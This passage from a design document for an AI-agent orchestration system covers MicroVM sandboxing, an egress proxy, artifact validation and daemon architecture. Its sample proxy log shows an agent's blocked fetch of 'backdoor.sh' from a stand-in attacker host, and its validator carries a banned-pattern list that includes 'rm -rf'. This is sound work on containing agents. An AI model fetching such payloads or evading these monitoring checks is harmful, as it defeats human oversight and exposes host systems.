      "SHA256 of extracted content matches what agent declared"
    ],
    "onFailure": "Quarantine artifacts. Revoke agent. Escalate to security role."
  }
}
```

**Pseudo-code: microvm-runner.mjs**

```javascript
// tools/ogu/commands/lib/microvm-runner.mjs

import { audit } from './audit.mjs';

/**
 * Execute a task inside an isolated MicroVM.
 * This replaces direct local execution for L1+ isolation levels.
 */
export async function executeInMicroVM(root, { task, agent, isolationLevel, inputEnvelope }) {
  const vmId = generateVMId(task.id);

  // Step 1: Determine isolation level
  const level = isolationLevel || determineIsolationLevel(task);

  audit.emit(root, {
    type: 'microvm_create',
    context: { vmId, taskId: task.id, level, agentId: agent.agentId }
  });

  // Step 2: Create VM
  const vm = await createVM(vmId, {
    level,
    vcpus: 2,
    memoryMb: 1024,
    diskMb: 2048,
    networkMode: level === 'L3-airgapped' ? 'none' : 'proxy',
    rootfsImage: getCachedRootfs(task.language || 'node')
  });

  try {
    // Step 3: Inject inputs
    await vm.injectFiles({
      code: prepareCodeSnapshot(root, task),
      taskSpec: inputEnvelope,
      secrets: level !== 'L3-airgapped'
        ? getTaskSecrets(root, agent, task)
        : {}, // Airgapped = no secrets
      agentConfig: {
        role: agent.roleId,
        tools: agent.permissions.tools,
        commands: agent.permissions.commands,
        timeoutMs: 300000
      }
    });

    // Step 4: Configure network proxy (if not airgapped)
    if (level !== 'L3-airgapped') {
      await configureEgressProxy(vmId, {
        allowedDomains: getAllowedDomains(root, task),
        sslInspection: level === 'L2-microvm',
        rateLimit: { requestsPerMinute: 60, bytesPerMinute: 50 * 1024 * 1024 },
        auditLog: true
      });
    }

    // Step 5: Execute agent inside VM
    const execResult = await vm.execute({
      entrypoint: 'ogu-agent-runner',
      args: ['--task', task.id, '--envelope', '/tmp/envelope.json'],
      timeoutMs: 300000,
      captureStdout: true,
      captureStderr: true
    });

    // Step 6: Extract artifacts
    const artifacts = await vm.extractArtifacts({
      expectedOutputs: task.expectedOutputs || [],
      extractDir: '/tmp/outputs/'
    });

    // Step 7: Validate extracted artifacts
    const validation = validateArtifacts(artifacts, task);
    if (!validation.passed) {
      audit.emit(root, {
        type: 'artifact_validation_failed',
        context: {
          vmId, taskId: task.id,
          violations: validation.violations,
          action: 'quarantine'
        }
      });

      // Quarantine + revoke agent
      await quarantineArtifacts(root, artifacts);
      await revokeAgent(root, agent.agentId, { reason: 'artifact_validation_failed' });

      return { success: false, reason: 'artifact_validation_failed', violations: validation.violations };
    }

    // Step 8: Apply artifacts to main repository
    await applyArtifacts(root, artifacts, task);

    audit.emit(root, {
      type: 'microvm_success',
      context: {
        vmId, taskId: task.id,
        artifactsExtracted: artifacts.length,
        networkRequests: await getProxyStats(vmId),
        executionTimeMs: execResult.durationMs
      }
    });

    return {
      success: true,
      outputs: artifacts,
      cost: execResult.cost,
      vmStats: {
        level,
        bootMs: vm.bootTimeMs,
        execMs: execResult.durationMs,
        networkRequests: await getProxyStats(vmId)
      }
    };

  } finally {
    // Step 9: ALWAYS destroy VM — even on failure
    await vm.destroy({ zeroMemory: true, scrubDisk: true });

    audit.emit(root, {
      type: 'microvm_destroyed',
      context: { vmId, taskId: task.id, guarantees: ['memory_zeroed', 'disk_scrubbed', 'no_processes'] }
    });
  }
}

/**
 * Determine isolation level from task risk profile
 */
function determineIsolationLevel(task) {
  if (task.capability === 'security_audit') return 'L3-airgapped';
  if (task.installsDependencies) return 'L2-microvm';
  if (task.readsExternalInput) return 'L2-microvm';
  if (task.tools?.includes('Bash')) return 'L1-container';
  if (task.riskTier === 'critical') return 'L2-microvm';
  return 'L0-local-trust';
}

/**
 * Validate artifacts before they leave the VM
 */
function validateArtifacts(artifacts, task) {
  const violations = [];

  for (const artifact of artifacts) {
    // File type check
    if (artifact.isBinary && !task.expectedOutputs.some(e => e.type === 'binary')) {
      violations.push({ file: artifact.path, reason: 'unexpected_binary' });
    }

    // Executable permission check
    if (artifact.permissions & 0o111) {
      violations.push({ file: artifact.path, reason: 'executable_permission_set' });
    }

    // Symlink check
    if (artifact.isSymlink) {
      violations.push({ file: artifact.path, reason: 'symlink_not_allowed' });
    }

    // Size check
    if (artifact.sizeBytes > 10 * 1024 * 1024) { // 10MB max per file
      violations.push({ file: artifact.path, reason: 'file_too_large', size: artifact.sizeBytes });
    }

    // Content hash check
    if (artifact.declaredHash && artifact.actualHash !== artifact.declaredHash) {
      violations.push({ file: artifact.path, reason: 'hash_mismatch' });
    }
  }

  return { passed: violations.length === 0, violations };
}
```

**Integration: Runner contract extension**

```javascript
// Extension to Stone 6's Runner interface

class MicroVMRunner extends Runner {
  async execute(inputEnvelope) {
    return executeInMicroVM(this.root, {
      task: inputEnvelope.task,
      agent: inputEnvelope.agent,
      isolationLevel: inputEnvelope.isolationLevel || 'auto',
      inputEnvelope
    });
  }

  supports(capability) {
    return true; // MicroVM can run any capability
  }

  get type() { return 'microvm'; }
}

// Runner selection: local < container < microvm < airgapped
// Selected automatically based on task risk profile
```

**CLI Commands:**

```
ogu vm:status                                  ← Show active MicroVMs
ogu vm:create --task <id> --level L2           ← Manually create VM for task
ogu vm:destroy <vmId>                          ← Force-destroy a VM
ogu vm:proxy-log <vmId>                        ← Show network proxy log for VM
ogu vm:validate <artifacts-dir>                ← Validate artifacts manually
ogu isolation:level <task-id>                  ← Show determined isolation level for task
ogu isolation:override <task-id> --level L3    ← Override isolation level
```

**Example:**
```
$ ogu vm:status
MICROVM STATUS:

  VM ID          TASK    LEVEL        AGENT          UPTIME   NETWORK    STATUS
  ────────────── ─────── ──────────── ──────────── ──────── ────────── ────────
  vm-a1b2c3d4    task-5  L2-microvm   backend        45s      proxy(12)  running
  vm-e5f6g7h8    task-7  L3-airgapped security       20s      none       running
  —              task-6  L0-local     frontend       —        host       local

  TOTALS: 2 VMs active, 1 local, 0 queued
  PROXY: 12 requests intercepted, 0 blocked

$ ogu vm:proxy-log vm-a1b2c3d4
EGRESS PROXY LOG: vm-a1b2c3d4 (task-5, L2-microvm)

  TIME      METHOD  DOMAIN                    PATH                          STATUS  SIZE
  ──────── ──────── ──────────────────────── ──────────────────────────── ──────── ──────
  14:30:01  GET     registry.npmjs.org        /jsonwebtoken/-/jsonwebtoken   200     45KB
  14:30:02  GET     registry.npmjs.org        /bcryptjs/-/bcryptjs           200     32KB
  14:30:05  GET     api.anthropic.com         /v1/messages                   200     8KB
  14:30:08  POST    api.anthropic.com         /v1/messages                   200     12KB
  14:30:15  GET     evil-attacker.com         /backdoor.sh                   ✗ BLOCKED
    └─ BLOCKED: Domain not in allowlist. Agent attempted unauthorized egress.
    └─ ACTION: Logged to audit. No agent revocation (single attempt).

  SUMMARY: 4 allowed, 1 blocked, 0 errors
```

**כלל ברזל:** Bash tool = minimum L1 isolation. External inputs = minimum L2. Security tasks = L3 airgapped. VMs are ephemeral — created, used, destroyed. Artifacts validated before extraction. Network egress proxy inspects EVERY request. VM destruction is physical — memory zeroed, disk scrubbed. No state survives.

---

## Iteration 7: Physical Architecture — מלוגיקה לסרביסים

> **Iterations 1-6 מתארים מוח. Iteration 7 מתאר גוף.**
> Logical Architecture מגדירה *מה* — Policies, State Machines, Scheduling Algorithms.
> Physical Architecture מגדירה *איך* — כמה processes רצים, מי מאזין לאיזה port, מה רץ ברקע ומה לפי דרישה.
> בלי Physical Architecture, אין אפשרות להריץ Auto-Transitions (שדורשות Polling), Scheduler (שמנהל תורים), או Multi-Agent Execution (שדורש Worker pool).
> זו האיטרציה שהופכת מסמך ל-**מערכת הפעלה רצה**.

---

### Topology 1: Service Map — 3 Daemons + CLI

המערכת מורכבת מ-**4 יחידות ריצה** ו-**שכבת persistence אחת**:

```
┌─────────────────────────────────────────────────────────────┐
│                    Human / Developer                         │
│                         │                                    │
│                    ┌────▼────┐                               │
│                    │ ogu CLI │  ◄── User Plane               │
│                    └────┬────┘                               │
│                         │ HTTP/Unix Socket                   │
│              ┌──────────▼──────────┐                        │
│              │   Kadima Daemon     │  ◄── Control Plane      │
│              │  (The Brain)        │                         │
│              │  - Scheduler        │                         │
│              │  - Policy Engine    │                         │
│              │  - State Machine    │                         │
│              │  - Budget Enforcer  │                         │
│              └──────────┬──────────┘                        │
│                    │         │                               │
│              ┌─────▼───┐ ┌──▼──────┐                       │
│              │ Runner 1 │ │ Runner N │  ◄── Data Plane      │
│              │ (Worker) │ │ (Worker) │                      │
│              │ -Worktree│ │ -MicroVM │                      │
│              │ -LLM Call│ │ -LLM Call│                      │
│              │ -AST Mrg │ │ -AST Mrg │                      │
│              └─────┬────┘ └──┬──────┘                       │
│                    │         │                               │
│              ┌─────▼─────────▼────┐                         │
│              │   Studio Server    │  ◄── Observability       │
│              │  - Dashboard       │                         │
│              │  - WebSocket       │                         │
│              │  - Event Stream    │                         │
│              └────────────────────┘                         │
│                         │                                    │
│              ┌──────────▼──────────┐                        │
│              │  .ogu/ Filesystem   │  ◄── Persistence       │
│              │  (JSON, JSONL, DB)  │                         │
│              └─────────────────────┘                        │
└─────────────────────────────────────────────────────────────┘
```

**Mapping to Kubernetes analogy:**

| K8s Concept | Company OS Equivalent | Role |
|---|---|---|
| `kubectl` | `ogu` CLI | User issues commands |
| API Server | Kadima Daemon HTTP API | Validates, authorizes, persists intent |
| Scheduler | Kadima Scheduler loop | Picks tasks, assigns to runners |
| Controller Manager | Kadima state machine loop | Enforces desired state, auto-transitions |
| Kubelet | Ogu Runner | Executes on node, reports back |
| Container Runtime | MicroVM / Worktree sandbox | Isolation boundary |
| etcd | `.ogu/` filesystem | Source of truth |
| Dashboard | Studio Web Server | Observability UI |

---

#### Service 1: `ogu` CLI — User Plane

**What:** Command-line tool the human developer runs in terminal.
**Runtime:** Not a daemon. Runs on-demand, exits when done.
**Binary:** `tools/ogu/cli.mjs` (already exists, 40 commands).

```json
{
  "service": "ogu-cli",
  "type": "on-demand",
  "entrypoint": "tools/ogu/cli.mjs",
  "runtime": "node",
  "ports": [],
  "dependencies": ["kadima-daemon (optional)"],
  "responsibilities": [
    "Parse user commands",
    "Read/write .ogu/ files directly (local operations)",
    "Forward orchestration commands to Kadima Daemon via HTTP/socket",
    "Display formatted output (tables, JSON, status)"
  ],
  "modes": {
    "standalone": "All logic runs in-process (Milestone 1)",
    "client": "Forwards to Kadima Daemon (Milestone 2+)"
  }
}
```

**Pseudo-code: Command dispatch with daemon awareness:**

```javascript
// tools/ogu/cli.mjs — enhanced entry point

import { isDaemonRunning } from './lib/daemon-client.mjs';

const DAEMON_COMMANDS = new Set([
  'agent:run', 'kadima:allocate', 'scheduler:status',
  'system:halt', 'system:resume', 'feature:state'
]);

const LOCAL_COMMANDS = new Set([
  'doctor', 'context', 'validate', 'init', 'log',
  'org:show', 'budget:status', 'audit:show'
]);

export async function dispatch(command, args) {
  // Local commands always run in-process
  if (LOCAL_COMMANDS.has(command)) {
    return executeLocal(command, args);
  }

  // Daemon commands: route to Kadima if running
  if (DAEMON_COMMANDS.has(command)) {
    if (await isDaemonRunning()) {
      return forwardToDaemon(command, args);
    }

    // Milestone 1 fallback: run in-process
    console.warn('[ogu] Kadima daemon not running. Executing locally.');
    return executeLocal(command, args);
  }

  // Hybrid commands: prefer daemon, fallback to local
  return (await isDaemonRunning())
    ? forwardToDaemon(command, args)
    : executeLocal(command, args);
}
```

**Daemon client:**

```javascript
// tools/ogu/lib/daemon-client.mjs

import { existsSync, readFileSync } from 'fs';

const PID_FILE = '.ogu/kadima.pid';
const SOCKET_FILE = '.ogu/kadima.sock';

export async function isDaemonRunning() {
  if (!existsSync(PID_FILE)) return false;

  const pid = parseInt(readFileSync(PID_FILE, 'utf8'));
  try {
    process.kill(pid, 0); // signal 0 = check if alive
    return true;
  } catch {
    return false;
  }
}

export async function forwardToDaemon(command, args) {
  const socket = existsSync(SOCKET_FILE) ? SOCKET_FILE : null;
  const url = socket
    ? `http://unix:${SOCKET_FILE}:/api/command`
    : 'http://127.0.0.1:4200/api/command';

  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command, args, cwd: process.cwd() })
  });

  if (!response.ok) {
    const error = await response.json();
    throw new Error(`[kadima] ${error.code}: ${error.message}`);
  }

  return response.json();
}
```

---

#### Service 2: Kadima Daemon — Control Plane

**What:** The organizational brain. Long-running background process (24/7).
**Runtime:** Node.js process managed by pm2 / systemd / launchd.
**Binary:** `tools/kadima/daemon.mjs` (new).
**Ports:** `4200` (HTTP API) + Unix socket `.ogu/kadima.sock` + `4201` (internal metrics).

```json
{
  "service": "kadima-daemon",
  "type": "daemon",
  "entrypoint": "tools/kadima/daemon.mjs",
  "runtime": "node",
  "ports": [
    { "port": 4200, "protocol": "HTTP", "purpose": "Control API (CLI + Studio)" },
    { "port": 4201, "protocol": "HTTP", "purpose": "Internal metrics (Prometheus format)" },
    { "socket": ".ogu/kadima.sock", "purpose": "Local fast-path (CLI)" }
  ],
  "pidFile": ".ogu/kadima.pid",
  "logFile": ".ogu/logs/kadima.log",
  "dependencies": [],
  "responsibilities": [
    "Run Scheduler loop (Closure 6) — pick tasks, assign to runners",
    "Run State Machine loop (Closure 2) — poll states, fire auto-transitions",
    "Run Consistency Reconciler (Closure 5) — periodic consistency checks",
    "Run Metrics Aggregator (Closure 8) — compute org health every 60s",
    "Run Knowledge Indexer (Closure 10) — background reindexing",
    "Enforce Budget on every task dispatch (Phase 2)",
    "Evaluate Policies on every transition (Closure 1)",
    "Manage Runner pool — spawn, monitor, kill workers",
    "Serve HTTP API for CLI and Studio",
    "Emit audit events for all state changes (Phase 3)"
  ]
}
```

**Schema: Daemon Configuration**

```json
{
  "$schema": "KadimaDaemonConfig",
  "version": 1,
  "file": ".ogu/kadima.config.json",

  "loops": {
    "scheduler": {
      "intervalMs": 5000,
      "enabled": true,
      "description": "Poll scheduler-state.json, dispatch ready tasks to runners"
    },
    "stateMachine": {
      "intervalMs": 10000,
      "enabled": true,
      "description": "Check feature states, fire auto-transitions"
    },
    "consistencyReconciler": {
      "intervalMs": 60000,
      "enabled": true,
      "description": "Verify cross-layer consistency (Closure 5)"
    },
    "metricsAggregator": {
      "intervalMs": 60000,
      "enabled": true,
      "description": "Recompute Org Health Score"
    },
    "knowledgeIndexer": {
      "intervalMs": 300000,
      "enabled": true,
      "description": "Reindex knowledge graph (Closure 10)"
    },
    "circuitBreakerProbe": {
      "intervalMs": 30000,
      "enabled": true,
      "description": "Probe half-open circuit breakers"
    }
  },

  "api": {
    "host": "127.0.0.1",
    "port": 4200,
    "metricsPort": 4201,
    "unixSocket": ".ogu/kadima.sock",
    "corsOrigins": ["http://localhost:3000"]
  },

  "runners": {
    "maxConcurrent": 4,
    "spawnMode": "local",
    "timeoutMs": 600000,
    "healthCheckIntervalMs": 15000
  },

  "features": {
    "autoTransitions": true,
    "autoScheduling": true,
    "ragInjection": true,
    "circuitBreakers": true,
    "semanticLocking": true
  }
}
```

**Pseudo-code: Kadima Daemon main loop:**

```javascript
// tools/kadima/daemon.mjs

import { createServer } from 'http';
import { writeFileSync, unlinkSync } from 'fs';
import { loadConfig } from './lib/config.mjs';
import { createSchedulerLoop } from './loops/scheduler.mjs';
import { createStateMachineLoop } from './loops/state-machine.mjs';
import { createConsistencyLoop } from './loops/consistency.mjs';
import { createMetricsLoop } from './loops/metrics.mjs';
import { createKnowledgeLoop } from './loops/knowledge.mjs';
import { createCircuitBreakerLoop } from './loops/circuit-breaker.mjs';
import { createApiRouter } from './api/router.mjs';
import { RunnerPool } from './runners/pool.mjs';
import { AuditEmitter } from './lib/audit.mjs';

const config = loadConfig('.ogu/kadima.config.json');
const audit = new AuditEmitter('.ogu/audit/');
const runnerPool = new RunnerPool(config.runners, audit);

// ── Write PID file ──
writeFileSync('.ogu/kadima.pid', String(process.pid));
audit.emit('daemon.start', { pid: process.pid, config });

// ── Start all background loops ──
const loops = [];

if (config.loops.scheduler.enabled) {
  loops.push(createSchedulerLoop({
    intervalMs: config.loops.scheduler.intervalMs,
    runnerPool,
    audit,
    onTask: async (task) => {
      // Build InputEnvelope (Closure 10: inject RAG context)
      const envelope = await buildInputEnvelope(task);
      // Check budget (Phase 2)
      await enforceBudget(envelope);
      // Evaluate policies (Closure 1)
      await evaluatePolicies(envelope);
      // Acquire semantic locks (Closure 9)
      await acquireSemanticLocks(envelope);
      // Dispatch to runner
      return runnerPool.dispatch(envelope);
    }
  }));
}

if (config.loops.stateMachine.enabled) {
  loops.push(createStateMachineLoop({
    intervalMs: config.loops.stateMachine.intervalMs,
    audit,
    onTransition: async (featureSlug, from, to) => {
      audit.emit('feature.auto_transition', { featureSlug, from, to });
      // Execute transition side-effects (trigger next phase)
    }
  }));
}

if (config.loops.consistencyReconciler.enabled) {
  loops.push(createConsistencyLoop({
    intervalMs: config.loops.consistencyReconciler.intervalMs,
    audit,
    autoFix: false // Only autoFix in deterministic mode
  }));
}

if (config.loops.metricsAggregator.enabled) {
  loops.push(createMetricsLoop({
    intervalMs: config.loops.metricsAggregator.intervalMs,
    audit
  }));
}

if (config.loops.knowledgeIndexer.enabled) {
  loops.push(createKnowledgeLoop({
    intervalMs: config.loops.knowledgeIndexer.intervalMs,
    audit
  }));
}

if (config.loops.circuitBreakerProbe.enabled) {
  loops.push(createCircuitBreakerLoop({
    intervalMs: config.loops.circuitBreakerProbe.intervalMs,
    audit
  }));
}

// ── Start HTTP API ──
const api = createApiRouter({ config, runnerPool, audit, loops });
const server = createServer(api);

server.listen(config.api.port, config.api.host, () => {
  audit.emit('daemon.api_ready', { port: config.api.port });
  console.log(`[kadima] Control API listening on ${config.api.host}:${config.api.port}`);
});

// ── Unix socket for local CLI fast-path ──
const unixServer = createServer(api);
unixServer.listen(config.api.unixSocket, () => {
  console.log(`[kadima] Unix socket at ${config.api.unixSocket}`);
});

// ── Graceful shutdown ──
const shutdown = async (signal) => {
  console.log(`[kadima] Received ${signal}. Shutting down gracefully...`);
  audit.emit('daemon.shutdown', { signal });

  // Stop all loops
  for (const loop of loops) {
    loop.stop();
  }

  // Wait for running tasks to complete (max 30s)
  await runnerPool.drainWithTimeout(30000);

  // Close servers
  server.close();
  unixServer.close();

  // Clean PID file
  unlinkSync('.ogu/kadima.pid');

  process.exit(0);
};

process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));

// ── Health check endpoint (internal) ──
const metricsServer = createServer((req, res) => {
  if (req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      status: 'healthy',
      uptime: process.uptime(),
      loops: loops.map(l => ({ name: l.name, running: l.isRunning, lastTick: l.lastTick })),
      runners: runnerPool.status(),
      pid: process.pid
    }));
  } else if (req.url === '/metrics') {
    // Prometheus format
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(generatePrometheusMetrics());
  }
});
metricsServer.listen(config.api.metricsPort, '127.0.0.1');
```

**Schema: Scheduler Loop (inside Kadima):**

```javascript
// tools/kadima/loops/scheduler.mjs

export function createSchedulerLoop({ intervalMs, runnerPool, audit, onTask }) {
  let timer = null;
  let isRunning = true;
  let lastTick = null;

  const tick = async () => {
    lastTick = new Date().toISOString();

    // 1. Read scheduler state
    const state = JSON.parse(await readFile('.ogu/scheduler-state.json', 'utf8'));

    // 2. Get ready tasks (not blocked, not scheduled, has budget)
    const ready = state.queue
      .filter(t => t.status === 'pending')
      .filter(t => !t.blockedBy || t.blockedBy.length === 0)
      .sort((a, b) => {
        // Weighted Fair Queuing (Closure 6)
        return a.virtualClock - b.virtualClock;
      });

    // 3. Check runner capacity
    const capacity = runnerPool.availableSlots();

    // 4. Dispatch up to capacity
    for (const task of ready.slice(0, capacity)) {
      try {
        task.status = 'dispatched';
        task.dispatchedAt = new Date().toISOString();
        await onTask(task);
        audit.emit('scheduler.dispatch', { taskId: task.id, runnerId: task.runnerId });
      } catch (err) {
        task.status = 'dispatch_failed';
        task.error = err.message;
        audit.emit('scheduler.dispatch_failed', { taskId: task.id, error: err.message });

        // Apply starvation prevention — bump priority if stuck
        if (task.dispatchAttempts >= 3) {
          task.priority = Math.max(0, task.priority - 1);
          audit.emit('scheduler.priority_bump', { taskId: task.id, newPriority: task.priority });
        }
      }
    }

    // 5. Persist updated state
    await writeFile('.ogu/scheduler-state.json', JSON.stringify(state, null, 2));
  };

  const start = () => {
    timer = setInterval(async () => {
      if (!isRunning) return;
      try { await tick(); } catch (err) {
        audit.emit('scheduler.loop_error', { error: err.message });
      }
    }, intervalMs);
  };

  start();

  return {
    name: 'scheduler',
    get isRunning() { return isRunning; },
    get lastTick() { return lastTick; },
    stop() { isRunning = false; clearInterval(timer); },
    forceTick: tick
  };
}
```

---

#### Service 3: Ogu Runner — Data Plane

**What:** Worker process that executes tasks. Spawned by Kadima.
**Runtime:** Node.js child process (Milestone 1-2) or standalone daemon (Milestone 3).
**Binary:** `tools/runner/worker.mjs` (new).
**Ports:** None (receives work via stdin/pipe in Milestone 1-2, HTTP in Milestone 3).

```json
{
  "service": "ogu-runner",
  "type": "worker",
  "entrypoint": "tools/runner/worker.mjs",
  "runtime": "node",
  "ports": [
    { "port": "dynamic", "protocol": "HTTP", "purpose": "Health check (Milestone 3 only)" }
  ],
  "spawnedBy": "kadima-daemon",
  "dependencies": ["kadima-daemon"],
  "responsibilities": [
    "Receive InputEnvelope from Kadima",
    "Create and manage Git worktree for isolation",
    "Set up execution sandbox (Closure 12 — local/container/microVM/airgapped)",
    "Call LLM API (Claude, GPT, etc.) via model router",
    "Execute code generation / review / test tasks",
    "Perform AST merge on output (Closure 9)",
    "Validate artifacts before reporting back",
    "Write OutputEnvelope to filesystem",
    "Report completion/failure to Kadima",
    "Self-destruct after task completion (stateless)"
  ]
}
```

**Schema: Runner Lifecycle State Machine:**

```
                ┌─────────┐
                │  IDLE    │  (waiting for work from Kadima)
                └────┬────┘
                     │ receive InputEnvelope
                ┌────▼────┐
                │ SETUP   │  (create worktree, set up sandbox)
                └────┬────┘
                     │ sandbox ready
                ┌────▼────────┐
                │ EXECUTING   │  (calling LLM, generating code)
                └────┬────────┘
                     │ LLM response received
                ┌────▼────────┐
                │ VALIDATING  │  (gate checks, AST merge, artifact validation)
                └────┬────────┘
                     │        │
              success│        │failure
                ┌────▼──┐  ┌──▼──────┐
                │ DONE  │  │ FAILED  │
                └───────┘  └─────────┘
                     │        │
                     ▼        ▼
              OutputEnvelope written + worktree cleaned up
```

**Pseudo-code: Runner execution:**

```javascript
// tools/runner/worker.mjs

import { createWorktree, cleanupWorktree } from './lib/worktree.mjs';
import { createSandbox } from './lib/sandbox.mjs';
import { callLLM } from './lib/llm-client.mjs';
import { mergeAST } from './lib/ast-merge.mjs';
import { validateArtifacts } from './lib/artifact-validator.mjs';
import { writeOutputEnvelope } from './lib/envelope.mjs';

export async function executeTask(inputEnvelope) {
  const { taskId, featureSlug, agent, files, context } = inputEnvelope;
  let worktreePath = null;
  let sandbox = null;

  try {
    // Phase 1: Setup
    reportStatus(taskId, 'SETUP');
    worktreePath = await createWorktree(featureSlug, taskId);
    sandbox = await createSandbox({
      level: inputEnvelope.isolationLevel,  // L0-L3 (Closure 12)
      worktreePath,
      allowedPaths: inputEnvelope.blast_radius?.allowed_write || [],
      network: inputEnvelope.network_policy || 'deny_all',
      envFilter: inputEnvelope.sandbox_policy?.envFilter || []
    });

    // Phase 2: Execute
    reportStatus(taskId, 'EXECUTING');
    const llmResponse = await callLLM({
      provider: inputEnvelope.routingDecision.provider,
      model: inputEnvelope.routingDecision.model,
      prompt: inputEnvelope.prompt,
      context: inputEnvelope.relevantHistory,  // RAG injection (Closure 10)
      tools: sandbox.allowedTools,
      maxTokens: inputEnvelope.budget.maxTokens,
      temperature: inputEnvelope.temperature || 0
    });

    // Phase 3: Validate
    reportStatus(taskId, 'VALIDATING');

    // AST merge (Closure 9) — not line-based merge
    const mergeResult = await mergeAST({
      base: worktreePath,
      changes: llmResponse.files,
      strategy: inputEnvelope.mergeStrategy || 'auto'
    });

    if (mergeResult.conflicts.length > 0) {
      // Escalate conflicts that can't be auto-resolved
      return writeOutputEnvelope(taskId, {
        status: 'conflict',
        conflicts: mergeResult.conflicts,
        partialMerge: mergeResult.merged,
        tokensUsed: llmResponse.usage
      });
    }

    // Validate artifacts (Closure 12)
    const validation = await validateArtifacts({
      files: mergeResult.merged,
      rules: inputEnvelope.validation_rules,
      maxFileSize: 1024 * 1024,  // 1MB
      bannedPatterns: ['eval(', 'exec(', 'child_process', '`rm -rf']
    });

    if (!validation.passed) {
      return writeOutputEnvelope(taskId, {
        status: 'validation_failed',
        violations: validation.violations,
        tokensUsed: llmResponse.usage
      });
    }

    // Phase 4: Done
    reportStatus(taskId, 'DONE');
    return writeOutputEnvelope(taskId, {
      status: 'success',
      files: mergeResult.merged,
      tokensUsed: llmResponse.usage,
      gateResults: validation.gates,
      astHash: mergeResult.astHash
    });

  } catch (err) {
    reportStatus(taskId, 'FAILED');
    return writeOutputEnvelope(taskId, {
      status: 'error',
      error: { code: err.code || 'OGU5001', message: err.message },
      tokensUsed: 0
    });

  } finally {
    // Always cleanup — runner is stateless
    if (sandbox) await sandbox.destroy();
    if (worktreePath) await cleanupWorktree(worktreePath);
  }
}

function reportStatus(taskId, status) {
  // Write to .ogu/runners/{taskId}.status.json
  writeFileSync(`.ogu/runners/${taskId}.status.json`, JSON.stringify({
    taskId, status, timestamp: new Date().toISOString(), pid: process.pid
  }));
}
```

---

#### Service 4: Studio Server — Observability Plane

**What:** HTTP + WebSocket server serving the Dashboard UI.
**Runtime:** Node.js process (Express/Fastify). Already partially exists.
**Binary:** `tools/studio/server/index.ts` (exists, extends).
**Ports:** `3000` (HTTP + WebSocket).

```json
{
  "service": "studio-server",
  "type": "daemon",
  "entrypoint": "tools/studio/server/index.ts",
  "runtime": "node",
  "ports": [
    { "port": 3000, "protocol": "HTTP+WS", "purpose": "Dashboard UI + real-time events" }
  ],
  "dependencies": ["kadima-daemon (reads .ogu/ files + Kadima API)"],
  "responsibilities": [
    "Serve React/Vite dashboard",
    "Proxy API calls to Kadima Daemon (port 4200)",
    "Stream real-time audit events via WebSocket",
    "Display DAG visualization, health scores, runner status",
    "Show approval requests, budget alerts, policy violations",
    "Provide org chart, agent status, feature lifecycle views"
  ]
}
```

**WebSocket event stream:**

```javascript
// tools/studio/server/ws/event-stream.mjs

import { watch } from 'fs';
import { WebSocketServer } from 'ws';
import { tail } from './lib/tail.mjs';

export function createEventStream(server) {
  const wss = new WebSocketServer({ server, path: '/ws/events' });

  wss.on('connection', (ws) => {
    // Watch audit log for new entries
    const auditWatcher = tail('.ogu/audit/current.jsonl', (line) => {
      const event = JSON.parse(line);
      ws.send(JSON.stringify({ type: 'audit', data: event }));
    });

    // Watch runner status files
    const runnerWatcher = watch('.ogu/runners/', (eventType, filename) => {
      if (filename?.endsWith('.status.json')) {
        const status = JSON.parse(readFileSync(`.ogu/runners/${filename}`, 'utf8'));
        ws.send(JSON.stringify({ type: 'runner', data: status }));
      }
    });

    // Watch scheduler state
    const schedulerWatcher = watch('.ogu/scheduler-state.json', () => {
      const state = JSON.parse(readFileSync('.ogu/scheduler-state.json', 'utf8'));
      ws.send(JSON.stringify({ type: 'scheduler', data: { queueSize: state.queue.length } }));
    });

    ws.on('close', () => {
      auditWatcher.close();
      runnerWatcher.close();
      schedulerWatcher.close();
    });
  });

  return wss;
}
```

---

### Topology 2: Persistence Layer — Local-First Storage

**כלל:** No external databases until Milestone 3. Everything is git-tracked JSON/JSONL files.

```
.ogu/
├── kadima.pid                          # Daemon PID (existence = daemon running)
├── kadima.sock                         # Unix socket (local IPC)
├── kadima.config.json                  # Daemon configuration
│
├── state/
│   ├── features/
│   │   └── {slug}.state.json           # Feature state machine (Closure 2)
│   ├── scheduler-state.json            # Task queue + virtual clocks (Closure 6)
│   ├── org-health.json                 # Latest health score (Closure 8)
│   └── system-mode.json                # halt/freeze/deterministic flags
│
├── agents/
│   ├── {roleId}.state.json             # Agent state + performance (Phase 0, Fix 7)
│   └── sessions/
│       └── {sessionId}.json            # Active agent sessions (Closure 4)
│
├── runners/
│   ├── {taskId}.status.json            # Runner heartbeat (ephemeral)
│   ├── {taskId}.input.json             # InputEnvelope (preserved)
│   └── {taskId}.output.json            # OutputEnvelope (preserved)
│
├── audit/
│   ├── current.jsonl                   # Today's append-only audit log (Phase 3)
│   ├── 2026-02-28.jsonl                # Archived daily logs
│   └── index.json                      # Audit search index
│
├── budget/
│   ├── budget-state.json               # Budget ledger (Phase 2)
│   └── transactions.jsonl              # All budget events
│
├── policies/
│   ├── rules.json                      # Policy rules source (Stone 1)
│   ├── compiled.json                   # Compiled AST (Closure 1)
│   └── overrides/
│       └── {overrideId}.json           # Active overrides (Fix 5)
│
├── locks/
│   ├── semantic.json                   # Semantic file locks (Closure 9)
│   └── transactions/
│       └── {txId}.json                 # Active SAGA transactions (Closure 5)
│
├── knowledge/
│   ├── entities.json                   # Knowledge graph nodes (Closure 10)
│   ├── embeddings.sqlite               # Vector store (Closure 10)
│   └── index.json                      # HNSW index metadata
│
├── circuit-breakers/
│   └── {domain}.json                   # Circuit breaker state (Closure 7)
│
├── snapshots/
│   └── {snapshotId}/                   # Company snapshots (Enhancement 2)
│
└── logs/
    ├── kadima.log                      # Daemon stdout/stderr
    └── runners/
        └── {taskId}.log                # Per-task runner logs
```

**File locking strategy:**

```javascript
// tools/contracts/lib/file-lock.mjs

import { writeFileSync, existsSync, readFileSync, unlinkSync } from 'fs';

/**
 * Advisory file lock using .lock sentinel files.
 * NOT flock() — works across Node.js processes on same filesystem.
 */
export class FileLock {
  constructor(targetPath) {
    this.lockPath = `${targetPath}.lock`;
    this.holder = null;
  }

  async acquire(holder, timeoutMs = 5000) {
    const start = Date.now();

    while (existsSync(this.lockPath)) {
